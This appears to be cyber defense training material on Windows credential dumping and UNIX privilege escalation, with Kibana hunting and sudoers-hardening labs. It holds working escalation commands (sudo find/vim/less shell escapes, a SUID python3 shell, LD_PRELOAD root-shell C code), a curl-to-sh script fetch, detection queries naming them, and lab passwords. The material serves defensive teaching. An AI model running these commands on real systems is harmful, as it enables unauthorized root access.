Adversaries use different techniques in an attempt to dump credentials from a compromised endpoint or host. Each technique targets a specific vulnerability or exploitable aspect of a host. Several credential dumping techniques were introduced in the Cyber Defense Analyst-Basic (CDA-Basic) course. As a refresher, these techniques target credentials stored in the SAM and in the Kerberos service.

﻿

Security Account Manager
﻿

According to Microsoft, SAM is a database that is present on computers running Windows operating systems that stores user accounts and security descriptors for users on the local computer. The SAM's primary purpose is to authenticate accounts requesting access to the host, whether local or remote. The adversary may attempt to locate, exfiltrate, and decrypt the SAM file, which is loaded into the registry for use during normal operations.

﻿

Kerberos
﻿

According to Microsoft, Kerberos is an authentication protocol that is used to verify the identity of a user or host. Kerberos utilizes a strong defense system, through the use of a ticketing system, to grant access and permissions to users. The adversary can gain access to Kerberos and the sensitive data through forging or injecting exfiltrated Kerberos tickets.

﻿---------------------

 Credential Dumping | Additional Techniques
There are many other credential stores that are used in Windows OSs that attackers target for dumping credentials. Some additional stores that are present on host machines include:

﻿

Local Security Authority Subsystem Service Injection
﻿

Local Security Authority Subsystem Service (LSASS) is a subsystem of the Local Security Authority (LSA). LSASS contains sensitive information regarding authentication including encrypted passwords, New Technology (NT) hashes, Local Network Manager (LM) hashes, and Kerberos tickets. The adversary can leverage LSASS by analyzing the process memory and files it contains. Through the use of Command and Control (C2) tools and techniques, the adversary can send the information to an external host and attempt to crack or decrypt the credentials. Additionally, adversaries can inject tools and executable files into Dynamic Link Library (DLL) that execute when LSASS is accessed. This provides access to the raw input or decrypted credentials.

﻿

WDigest.dll
﻿

WDigest was launched through Windows XP, specifically crafted for Hypertext Transfer Protocol (HTTP) and Simple Authentication and Security Layer (SASL) authentication. The primary function of the WDigest is to send confirmation of secret keys in order to authenticate the protocol. A key vulnerability was that WDigest included a default protocol on Windows XP-8, and Windows Server 2003-2012, which stored credentials in plaintext. Newer versions of Windows, Windows 10, Server 2012 R2, and Server 2016, do not have the protocol enabled by default. Adversaries may attempt to manipulate the WDigest.dll file in an effort to gain access to system credentials. WDigest.dll is loaded into processes so that the Windows OS can authenticate between Windows and non-Windows operating environments. The primary use of the authentication provided by WDigest.dll occurs via HTTP and SASL. Processes that use WDigest.dll can be manipulated through the use of a tool such a Mimikatz or PowerShell to exploit credentials handled using WDigest. 

﻿---------------------

 Credential Dumping Techniques | Compromised Domain Controller
Adversaries use different techniques in an attempt to dump credentials from a compromised DC. Each technique targets a specific vulnerability or exploitable aspect of the DC. Below are techniques from a comprised DC:

﻿

New Technology Directory Services Secrets
﻿

New Technology Directory Services (NTDS) are used by the Windows OS to locate and manage network resources and authenticate users. A key file utilized by NTDS is the NTDS.dit. A Directory Information Tree (.dit) file is utilized by Active Directory (AD). The NTDS.dit is located on the DC and contains users, groups, security descriptors, and password hashes. 

﻿

Group Policy Preference Files 
﻿

According to Microsoft, Group Policy Preferences is a collection of Group Policy client-side extensions that deliver preference settings to domain-joined computers running Microsoft Windows desktop and server operating systems. Preference settings are administrative configuration choices deployed to desktops and servers. The preference settings also allow administrators to manage multiple domain policies including embedded credentials. The adversary can leverage these files, decrypt, and access credential information. 

﻿

DCSync
﻿

Large networks may contain multiple DCs, and as a result, DCs may be configured to synchronize with one another through the use of API calls. Information containing users, groups, computers, and authentication information (such as hashes) is sent through the synchronization API calls. The adversary may attempt to mimic the behavior and authentication process of a DC — causing a DC to provide credential hashes. 

﻿----------------

 Credential Dumping Detection
Credential dumping detection relies on clear and consistent log data collection. Below are common credential dumping detection strategies.

﻿

API Monitoring 
﻿

API monitoring refers to watching and analyzing known users, accounts, Internet Protocol (IP) addresses, applications, and devices that are expected to make calls to the network's DC. Monitoring API calls can uncover unexpected or suspicious connections to the DC on the network. Often, credential dumping techniques require tools and exploits that leverage connections to the DC, however, the connections may be from unexpected, or unusual sources, making them easier to identify. To enable API monitoring, a tool such as System Monitor (Sysmon) must be installed and configured. Sysmon can collect and record events that enable analysts to identify suspicious API calls. See the additional resources for a community project to map Windows API calls to Sysmon Events.

﻿

Process Monitoring 
﻿

Process monitoring refers to watching and analyzing known processes and applications that are expected to be used and communicate with each other on the network. Monitoring processes on the network can uncover tools and software, such as Mimikatz, Empire, or shad0w, that can be used for injection into processes. A key component of process monitoring is knowledge of which applications and processes are expected to run simultaneously. Unexpected, or outlier, pairings of applications and processes may identify suspicious or questionable activity on the network. 

﻿

Event Logs
﻿

Collection and analysis of event logs is the paramount credential dumping detection strategy. Event logs contain Identifiers (ID) with information regarding movements, processes, and accounts. Nearly all events can be relevant when hunting potentially Malicious Cyberspace Activity (MCA), however, below are key events to consider when detecting credential dumping:

﻿

Sysmon Event ID 1/Windows Event ID 4688: Process Creation 
﻿

According to Microsoft, the sysmon Process Creation event provides extended information about a newly-created process. With Process Creation, suspicious processes (such as Mimikatz, Empire, or shad0w) may appear. The processes can be correlated to other events based on timestamp or subprocess.

﻿

Sysmon Event ID 8: CreateRemoteThread
﻿

According to Microsoft, the sysmon CreateRemoteThread event detects when a process creates a thread in another process. This technique is used by malware to inject code and hide in other processes. The event indicates the source and target process. It gives information on the code that runs in the new thread: StartAddress, StartModule, and StartFunction.

﻿

Sysmon Event ID 10/Windows Event ID 4656: ProcessAccess 
﻿

According to Microsoft, the sysmon ProcessAccess event reports when a process opens another process, an operation that is often followed by information queries or reading and writing the address space of the target process. 

![image](https://github.com/user-attachments/assets/44d977fc-8d75-4273-bac4-10439b98ec4c)



------------------

Hunting for Credential Dumping
Walk through the creation and development of visualizations and hunting strategies to detect credential dumping on the network. 

﻿

Workflow

--------------

Hunting for Credential Dumping Activity on the VCCH Network
As with host ch-tech-2, the VCCH network is vulnerable to suspicious activity including credential dumping. The host ch-tech-2 may not be the only one on the network that is being exploited by a persistent threat. The VCCH network owner has requested analysis of their network to determine if there are additional adversarial presences attempting to dump credentials from an exploited host. VCCH has requested a review of data collected from December 13, 2021, specifically between 13:45:00.000 and 14:45:00.000.

﻿

Workflow

---------------------------

Host Activity
ch-tech-1 has experienced the process mimikatz.exe running within the specified time span. mimikatz.exe is malware that is frequently used by adversaries to leverage vulnerabilities and find useful credential information. Any use of mimikatz.exe should be considered suspicious and must be investigated. 

﻿

Events Associated with mimikatz.exe
﻿

Workflow

﻿

NOTE: The following step continues from the previous steps.

﻿

4. Add the event.code field to the data to discover the events associated with mimikatz.exe. 


-------------

Discover Activity
﻿

Figure 9.2-15

﻿

Event codes 1, 10, and 4688 are associated with mimikatz.exe. These events needs to be investigated further to determine the type of activities that are associated with them.

﻿![image](https://github.com/user-attachments/assets/12fcfffd-02f3-486f-a2f2-873131e5bb61)


Workflow

﻿

NOTE: The following step continues from the previous steps.

﻿

5. Access the Discover page. Filter the page by host ch-tech-1. Ensure the time span is set to the span in question. 


--------------------

Hunting for Sysmon Event ID 10

![image](https://github.com/user-attachments/assets/3075ad2a-0bd6-4ce3-a135-d336cda98948)

The ch-tech-1 host experienced 1,926 events over the 60-minute time span. 


Based on the data table created previously, ch-tech-1 was used to access mimikatz.exe (Sysmon event ID 1). Based on the data table, mimikatz.exe on host ch-tech-1 was used to access another process (Sysmon event ID 10).


Workflow


NOTE: The following step continues from the previous steps.


6. Query the Discover page for Sysmon event ID 10. Ensure the ch-tech-1 host is still in place.


![image](https://github.com/user-attachments/assets/b351ff53-fa3e-4ddd-87ab-bf0cdc0162bb)

![image](https://github.com/user-attachments/assets/605ab211-42f0-47ad-8f06-1c4355429d15)


---------------------

Analyzing Sysmon Event ID 10

![image](https://github.com/user-attachments/assets/2c26c385-1457-4a40-9c30-e4cb02e9581c)

Sysmon event ID 10 occurred five times on the ch-tech-1. The occurrences of Sysmon event ID 10 include all processes that function on the host. An additional parameter must be included to return results from the mimikatz.exe process.


Workflow


NOTE: The following step continues from the previous steps.


7. Include an additional parameter in the query. Query the Discover page for Sysmon event ID 10 and mimikatz.exe. Ensure the ch-tech-1 host is still in place. 

----------------------------------


Analyzing mimikatz.exe

![image](https://github.com/user-attachments/assets/4b7aedd0-4b3c-41a2-8b26-85154311eb0c)



Sysmon event ID 10 occurred 1 time as a result of the process mimikatz.exe.


Workflow


NOTE: The following step continues from the previous steps.


8. Review the Sysmon event ID 10 log file details, and answer the following questions. 

--------------------------------

Log Data
The information collected in the log files within Elastic Stack is shown in Figures 9.2-19 – 9.2-21.

﻿

Process Executable Path
﻿

![image](https://github.com/user-attachments/assets/5dc5185c-c68f-4fbb-8c77-8b3f402c0e77)


The process.executable field contains the path that was used to access mimikatz.exe.


LSASS.exe

![image](https://github.com/user-attachments/assets/1000a60c-d190-42ff-be97-8d5a37a2d655)

The winlog.event_data.TargetImage field contains the path mimikatz.exe used to access the process lsass.exe. 


MITRE ATT&CK Technique 

![image](https://github.com/user-attachments/assets/d559659e-2143-43b1-b5e5-20d91ed2c95b)

The message field contains the MITRE ATT&CK technique associated with the event.

---------------------


Analysis Conclusion
Through the use and analysis of Elastic Stack, an outlier data point within processes used on the network has been identified. The outlier process (mimikatz.exe) is a known tool leveraged by adversaries relative to other processes in the collected logs. The process connected with the lsass.exe process is an attempt to perform credential dumping. The VM ch-tech-1 needs to be further investigated for adversarial persistence and to identify the compromised data.

-------------------------

#### CDAH-M9L3-UNIX Privilege Escalation #### 

What Is UNIX Privilege Escalation?
Privilege escalation occurs when an adversary gains higher-level permissions than they previously had access to. In UNIX systems, a variety of ways exists to perform privilege escalation. It is critical that CPT analysts understand how privilege escalation works as well as how to detect and prevent it. Although an adversary gains initial access or reconnaissance in a network with a low-privilege account, they need to escalate privileges to complete their mission. Obtaining elevated privileges allows an adversary to perform actions, such as resetting passwords, modifying privileges of other users, configuring persistence, and accessing protected data.


------------------------

Reconnaissance
Before an adversary escalates privileges, they need to perform reconnaissance (recon) to discover which privilege escalation methods are available. Although it is possible to manually run individual commands to check for different types of escalation methods, adversaries often use scripts for the sake of efficiency. A popular script to find escalation options in UNIX is the Linux Privilege Escalation Awesome Script (LinPEAS). The LinPEAS GitBook site includes a section on LINUX privilege escalation and is a useful reference of commands that are used for recon instead of running a script. See the Resource section below for additional information.

﻿

LinPEAS can be run using a single command that pulls the script from GitHub using curl and pipes the script to sh to execute.

curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
﻿

Figure 9.3-1 provides an example section from the output of LinPEAS showing exploitable sudo settings. The user sam has the ability to use sudo to run find, less, and vim without being prompted for a password. This information is found by running sudo -l.

![image](https://github.com/user-attachments/assets/e3f7a161-216f-463e-b7a3-1cf7335b6f6b)



Running a script may be noisy. An alternative is to run individual commands to look for specific escalation options.


The following provides a list of commands adversaries often run when performing manual reconnaissance.


Check for a vulnerable kernel version.
uname -a
hostnamectl
cat /proc/version



Check environment variables for sensitive information, such as username, password, or Application Programming Interface (API) keys.
env
set



Check for a vulnerable version of sudo.
sudo -V



Check for vulnerable software installed on the system.
dpkg -l
rpm -qa



Check running processes to see if any are running with elevated privileges.
ps aux
ps -ef



Check cron jobs to see if any are running with elevated privileges. If the user has a way to write to the script, they could hijack it.
crontab -l



Resource
HackTricks Linux Privilege Escalation: https://book.hacktricks.xyz/linux-unix/privilege-esca lation

-----------------------

GTFOBins
GTFOBins is a curated list of UNIX binaries that can exploit common misconfigurations to gain elevated privileges.

﻿

Although GTFOBins was made for pentesters to reference ways to perform privilege escalation while living off the land, it is also quite useful for defenders. GTFOBins is used to reference the commands used by adversaries to escalate privileges and hunt for their usage in logs.

﻿

A defender performing a routine audit on their UNIX systems can use GTFOBins to check different binaries found in the sudoers file or that have the Set User Identification (SUID) or Set Group Identification (SGID) bits set.

﻿

Figure 9.3-2 shows the GTFOBins page for the find binary. Privilege escalation is possible with find if the SUID is set or if the user has the ability to run find using sudo. If the user has a restricted shell, they may be able to break out using find.

![image](https://github.com/user-attachments/assets/190df76d-0523-4e4b-ab8d-bfbb4d07ce58)


---------------------------

Sudo
Sudo — sometimes referred to as Superuser Do! — can be misused by adversaries to gain elevated privileges. This is not due to vulnerabilities in sudo but, rather, to configuration options sudo provides for users to be allowed to run only certain applications with elevated privileges.

﻿

The command sudo -l shows a user which binaries the current user has the permission to run using sudo (a specific user can be specified with the -U user option). Once the list of binaries is obtained via sudo -l, a quick search on GTFOBins provides the adversary with available privilege escalation methods.

﻿

Figure 9.3-3 provides example output of sudo -l, where the user sam has the ability to run find, less, and vim using sudo without being prompted for a password.

![image](https://github.com/user-attachments/assets/576d9fc0-b535-432d-a13d-eb89df5b5579)

A search on GTFOBins for “find” returns the privilege escalation methods available for that command. In this case, running the following command is one option to escalate privileges to root:
sudo find . -exec /bin/sh \; -quit

![image](https://github.com/user-attachments/assets/1e728a88-32c8-457c-a9ee-17f8c1b82738)


less and vim can also be used for privilege escalation in this case.


For less, the following command will escalate privileges to root:
sudo less /etc/profile
!/bin/sh



For vim, the following command will escalate privileges to root:
sudo vim -c ':!/bin/sh'



Multiple commands thus far have contained !/bin/sh. !/bin/sh can be used as a catchall Security Information and Event Management (SIEM) search to hunt for most of these basic privilege escalation commands. However, an adversary may know that and use other methods to be stealthier.


For example, the following command also escalates privileges using vim but without using the !/bin/sh string in the command. The !/bin/sh string is also found in many standard scripts that may return as false-positive results for the analyst to analyze and exclude.
sudo vim
:shell

----------------------

SUID and SGID
SUID and SGID are features of UNIX permissions that allow a binary to be configured to always run in the context of the owner or group of the file rather than of the user who ran the binary. Adversaries abuse binaries where the SUID or SGID bits are set. Setting these privileges opens up the potential for privilege escalation, privileged file reads, and privileged file writes. An adversary finds such binaries by running a search using the find command.

﻿

The following command returns all files with the SUID bit set:

find / -type f -perm -04000 -ls 2>/dev/null
﻿

The following command returns all files with the SGID bit set:

find / -type f -perm -02000 -ls 2>/dev/null

![image](https://github.com/user-attachments/assets/cde4c241-87f6-4256-9138-30edd9ba45f1)

The path /usr/libexec/platform-python3.6 is where CentOS stores the platform-specific python3 binary. According to the Fedora Project, “Platform Python will be a separate stack of Python packages aimed to provide all necessary dependencies.”


/usr/bin/python3 is a string of links that eventually lead to /usr/libexec/platform-python3.6, as shown in Figure 9.3-6.

![image](https://github.com/user-attachments/assets/f3d548a9-bc2b-493e-ba90-0a5ddee6c271)

Searching the files on GTFOBins helps the adversary know which files can be used to get them closer to privilege escalation. In this case, /usr/libexec/platform-python3.6 has the SUID bit set. This is enough to allow for privilege escalation using the following command:
./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'



Below is a breakdown of the Python command:
./python3 executes the python3 binary.
-c tells Python that a command is going to be executed.
The single quotes encapsulate the command.
import os tells Python to import the os module.
os.execl is the execl function that executes a new program.
"/bin/sh" is the path.
"sh" and "-p" are the arguments to spawn a shell.

![image](https://github.com/user-attachments/assets/22b68100-ee3d-4f8c-9dbf-cf96fa68c810)

Not all binaries are able to do direct privilege escalation. Some only allow for file reads or writes as the privileged user. If file read or write is allowed, the adversary uses that to perform privilege escalation via a script.

----------------------

Dynamic Linker Hijacking
Adversaries hijack environment variables that the dynamic linker (ld) uses to load shared libraries. This allows them to escalate privileges using a binary that can be executed with sudo.

﻿

If env_keep+=LD_PRELOAD is found in the sudo -l output, the system is vulnerable to dynamic linker hijacking.

![image](https://github.com/user-attachments/assets/1021d9b4-4df2-45a2-9efe-591b453b7be2)

NOTE: By default, the sudoers file starts the loading of environment variables with Defaults env_reset. This ensures that every time sudo is run, the environment variables are reset. However, when an environment variable is preceded by env_keep+=, it will persist across sudo usage.


The LD_PRELOAD environment variable holds a user-specified list of additional shared objects to be loaded before any other shared objects. The dynamic linker loads those shared objects/libraries and executes any initialization functions that are contained in the objects. LD_PRELOAD can be used to escalate privileges using any binary that the user is able to run as sudo, as long as sudo is configured to retain the LD_PRELOAD environment variable. The binary does not need to have any other privilege escalation options available because the attacker is instructing the system to first load an additional library, which they control. The example provided below uses the find command that also has additional escalation methods available, but this method would work just as well using the ping command, which does not have any privilege escalation options available on its own.


The following is an example of this privilege escalation method:


The following file is created in /tmp/pe.c. This program unsets the LD_PRELOAD variable. If LD_PRELOAD is not unset, it will be stuck in a loop when attempting to perform privilege escalation. It also sets the group ID and user ID to 0 so that the shell spawned next is root. Last, it spawns a bash shell.
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}



Now that the .c file has been created, it must be compiled into a shared object library that can be assigned to LD_PRELOAD.
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles



Assigning the pe.so shared object library to LD_PRELOAD and running find as sudo spawns a root bash shell.
sudo LD_PRELOAD=/tmp/pe.so find


![image](https://github.com/user-attachments/assets/81e34ba1-1ce7-42da-9fb5-b5c880946f72)

![image](https://github.com/user-attachments/assets/8faea6e2-72bd-47f2-97f0-9a1303e772a2)


--------------------

Finding and Testing Privilege Escalation Methods in UNIX
Understanding how adversaries perform privilege escalation is extremely valuable for a CPT analyst. The CPT analyst can not only perform better hunts but also more effectively test privilege escalation methods to ensure fixes are successful.

﻿

1. Log in to the kali-hunt Virtual Machine (VM) using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open the terminal.

﻿

3. Use the Secure Shell (SSH) protocol to connect to the ch-dev-cent VM:

(trainee@dmss-kali)-[~] $ ssh sam@ch-dev-cent
sam@ch-dev-cent's password: CyberTraining1!
﻿

4. Check if there are any binaries the user is allowed to run using sudo.

[sam@centos ~]$ sudo -l

![image](https://github.com/user-attachments/assets/c1577100-a7aa-4431-816a-527a5c35429b)

5. Search for all three binaries on the GTFOBins GitHub page. According to GTFOBins, find, less, and vim all have privilege escalation methods available with SUID or sudo privileges. The commands to escalate privileges using find, less, and vim, respectively, are as follows:
sudo find . -exec /bin/sh \; -quit

sudo less /etc/profile
!/bin/sh

sudo vim -c ':!/bin/sh'



6. Enter the following command to escalate privileges using the find command:
[sam@centos ~]$ sudo find . -exec /bin/sh \; -quit

![image](https://github.com/user-attachments/assets/c53d3c79-8be0-40d7-8bf9-e5191d516d98)




7. Verify that privilege escalation was successful by running the id command after the privilege escalation attempt:
sh-4.4# id

![image](https://github.com/user-attachments/assets/8751c7dc-7a46-4da7-b764-6b65738eb497)

8. Find evidence of the privilege escalation activity in /var/log/secure:
sh-4.4# cat /var/log/secure | grep /bin/sh

![image](https://github.com/user-attachments/assets/91ecbb29-7f82-4173-a2e2-4f247b4310ef)

9. Use the exit command to leave the privileged shell and return to the sam user shell:
sh-4.4# exit



10. Escalate privileges using the less and vim commands from step 5.


Note that after exiting the privileged shells gained in the above step both less and vim will still be running. Each of those processes must be exited to return to the original shell command prompt.


Escalating privileges on UNIX systems can be quite simple when the right misconfigurations are in place. Systems must be monitored and audited often to ensure such misconfigurations do not occur on systems and lead to simple escalation paths for adversaries.

------------------------------

Detecting UNIX Privilege Escalation
Detecting privilege escalation requires proper logging to be configured before privilege escalation occurs. Auditd is a LINUX auditing system that uses rules to determine what to log and what to ignore. Florian Roth, a well-known security professional, hosts a popular set of Auditd security-monitoring rules on a GitHub page. (See the Resources section below.)

﻿

When using the Elastic Stack, AuditBeats is another option for logging on UNIX systems. Auditbeats uses Auditd, file integrity, and system logging and has all the built-in parsing and cleanup scripts required for the logs to flow neatly into the Elastic Stack.

﻿

Sudo
﻿

Resources like GTFOBins are powerful for defenders. Knowing which commands an adversary needs to run to escalate privileges allows defenders to easily find suspicious activity using tools like Kibana. The following is an example of a search to hunt for the find command being used for privilege escalation, with the process.title being the command found on GTFOBins:

agent.type: auditbeat AND event.action: executed AND process.title: "sudo find . -exec /bin/sh \; -quit"
﻿

Here, user.effective.name is root and user.name is sam. The effective user is the user that sudo was used to escalate to, so this reveals that the user sam used the misconfiguration to escalate privileges to root.

![image](https://github.com/user-attachments/assets/6f831c0b-9d8f-40bf-8a2b-b24c1f77677b)

SUID and SGID


Monitoring for chmod usage to set SUID and SGID bits helps to catch misconfigurations before an adversary can exploit them. The following search finds any usage of chmod to set SUID or SGID bits:
agent.type: auditbeat AND event.action: executed process.title: "chmod u+s"


![image](https://github.com/user-attachments/assets/37d357ef-0608-428a-89fa-43ba85a09aae)



Creating alerts around this activity greatly increases visibility when these misconfigurations happen and leads to faster resolution times.


Hunting for known privilege escalation commands from GTFOBins helps detect this malicious activity. The following is an example of a search to detect python3 being used for privilege escalation due to the SUID bit being set:
agent.type: auditbeat AND event.action: executed AND process.title: "python3 -c import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")"



Notice the backslashes before the double quotation marks. This is required to escape the quotation marks that are part of the search string. If the double quotation marks are not escaped, Kibana throws an error.

![image](https://github.com/user-attachments/assets/da4b5d86-528a-4394-a737-47231ba481f3)

Dynamic Linker Hijacking


Running sudo -l and looking for env+=LD_PRELOAD determines if LD_PRELOAD can be used for privilege escalation.


In Kibana, searching for process.args: "LD_PRELOAD" is one way to search for simple usage of this privilege escalation method. This search returns multiple event actions. The event.action value of executed shows when the LD_PRELOAD privilege escalation method was initially used, and the event.action value of existing_process shows that there is an active shell that was spawned at some point in the past.

![image](https://github.com/user-attachments/assets/a15a24b9-5005-478e-aac3-b8b1e6ecbb13)

![image](https://github.com/user-attachments/assets/f604d09b-56c2-4544-93b3-72cd8312041c)


---------------------------

Detecting UNIX Privilege Escalation | Lab
Using a SIEM solution to detect threats is a critical skill for a CPT analyst. The following exercise covers detection of common UNIX privilege escalation using Kibana.

﻿

1. Log in to the kali-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Firefox.

﻿

3. Select the Discover - Elastic bookmark.

﻿

4. Log in to Security Onion using the following credentials:

Username: trainee@jdmss.lan
Password: CyberTraining1!
﻿

5. Run the following search against the time range of Jan 20, 2022 @ 22:00:00.000 to Jan 21, 2022 @ 00:00:00.000:

agent.type: auditbeat

![image](https://github.com/user-attachments/assets/16ee51e8-e00f-4347-b48d-1560df9ddd6a)

6. Add the following fields to the results:
event.action
process.title
host.name
user.name
process.args

![image](https://github.com/user-attachments/assets/e0a21320-81c8-45fd-9352-bc7eb462684a)


7. Use the sudo find command from GTFOBins to search for privilege escalation:
agent.type: auditbeat AND event.action: executed AND process.title: "sudo find . -exec /bin/sh \; -quit"

![image](https://github.com/user-attachments/assets/aecd5b6e-b264-436d-b1a8-7d44690d3611)




Sam escalated privileges on the centos host due to a misconfiguration in the sudoers file. During an actual hunt, analysts may not have the benefit of knowing the specific command that was executed, so they must begin analysis at a higher level, such as all uses of sudo. During an investigation, analysts may have indications of the commands that were run from other logs or events already collected and use those commands as the basis for hunts in other parts of the network.


8. Use the python command under the SUID section of GTFOBins to search for privilege escalation activity. Escape any quotation marks in the search string.
agent.type: auditbeat AND event.action: executed AND process.title: "python3 -c import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")"


![image](https://github.com/user-attachments/assets/ed99ff6d-56b3-4c5b-9d4c-9c876527f0a8)



Sam escalated privileges on the centos host due to python3 having the SUID bit set. The use of /bin/sh, and similar other shells, to spawn a child shell should be investigated to ensure they are not malicious. Many attackers use /bin/sh to execute privilege escalation techniques and other programs, so targeted queries for those shell commands may highlight activity that should be investigated.


9 . See how  many other privilege escalation methods being exploited can be found.

---------------------------------

Preventing UNIX Privilege Escalation
Preventing the most common privilege escalation methods on UNIX systems requires auditing scripts, services, and other executables that have elevated privileges, including the /etc/sudoers file. All three privilege escalation methods discussed in this lesson may be prevented by keeping the sudoers file configured properly.

﻿

Sudo
﻿

To prevent privilege escalation for a binary in the sudoers file, visudo must be used to remove the offending lines.

﻿

Figure 9.3-22 provides an example of the offending lines:

![image](https://github.com/user-attachments/assets/a4bd24c6-ab11-4cfd-a986-382e38c732ee)

A recommendation is that before removing the lines, a check should be done for why they were added and a check of GTFOBins should be done to see if those binaries can be used for privilege escalation.


In this case, all three binaries can be used to escalate privileges. The commands used to escalate privileges with find, vim, and less, respectively, are as follows:


sudo find . -exec /bin/sh \; -quit

sudo vim -c ':!/bin/sh'

sudo less /etc/profile
!/bin/sh



NOTE: An easy way to remove the lines once in visudo is to navigate to the lines, and, once the cursor is on a line to be removed, enter dd, which deletes the current line. To remove multiple lines at once, enter the number of lines to remove, and enter dd.


NOTE: visudo requires root privileges by default. There are times when visudo may be in the sudoers file to allow specific users the ability to modify the sudoers file. However, this is not recommended, as visudo can be used to escape to a root shell. Only users with full administrative privileges should be allowed to run visudo.


With the cursor on the line sam ALL=(ALL) NOPASSWD:/usr/bin/find, the following keystrokes remove that line as well as the two following lines:
3dd



SUID and SGID


To prevent the SUID and SGID bits from being set and exploited for privilege escalation, create alerts to audit the use of chmod where the process.args contains s+ or u+s. Elastic has a prebuilt rule for this specific use case. (See the Resource section below.) If chmod is used to set the SUID or SGID bits on a binary, find the binary on GTFOBins to see if it can be exploited for privilege escalation. If the binary is found on GTFOBins, the SUID and SGID bits must be removed.


The commands used with find to locate all files with SUID or SGID bits set, respectively, are as follows:


find / -type f -perm -04000 -ls 2>/dev/null

find / -type f -perm -02000 -ls 2>/dev/null



The following commands are used to set the SUID bit and remove the SUID bit, respectively:


chmod u+s $filename

chmod u-s $filename



The following commands are used to set the SGID bit and remove the SGID bit, respectively:


chmod g+s $filename

chmod g-s $filename



Additional lessons discuss other methods of identifying and tracking changes to files using tools like the file integrity tracker tripwire.


Dynamic Linker Hijacking


To prevent privilege escalation via dynamic linker hijacking, the sudoers file must be modified to prevent the usage of LD_PRELOAD. This is accomplished by using the visudo command to edit the sudoers file and remove the string Defaults env_keep+=LD_PRELOAD.


![image](https://github.com/user-attachments/assets/1e3abdad-2183-4d97-aaad-d6fc4f5eecb5)


-----------------------

Challenge: Preventing UNIX Privilege Escalation
Audit the sudoers file to check for misconfigurations. If misconfigurations are found, fix them, and test to ensure the privilege escalation methods do not work.

﻿

1. Log in to the kali-hunt VM using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. SSH in to the ch-dev-cent VM:

(trainee@dmss-kali)-[~] $ ssh trainee@ch-dev-cent
trainee@ch-dev-cent's password: CyberTraining1!

![image](https://github.com/user-attachments/assets/43877ce8-f154-4518-b800-83650018f769)

3. Use visudo to edit the sudoers file, using the following credentials:
[trainee@centos ~]$ sudo visudo
[sudo] password for trainee: CyberTraining1!



4. Review the sudoers file for misconfigurations. Use the search function (/) to search for known bad strings.


5. Search binaries found on GTFOBins to see if they can be used for privilege escalation via sudo. Take note of the commands that escalate privileges.


6. Remove the misconfigurations. dd deletes the line the cursor is on.


7. Save and close the file using the following command:
:wq



8. Switch the user to sam’s profile:
[trainee@centos ~]$ sudo su - sam
[sam@centos ~]$



9. Attempt to escalate privileges using the methods found in step 5 to ensure the privilege escalation methods were removed.

![image](https://github.com/user-attachments/assets/98196361-4a66-4e8c-b0bf-8e423ba53182)


-------------------






































































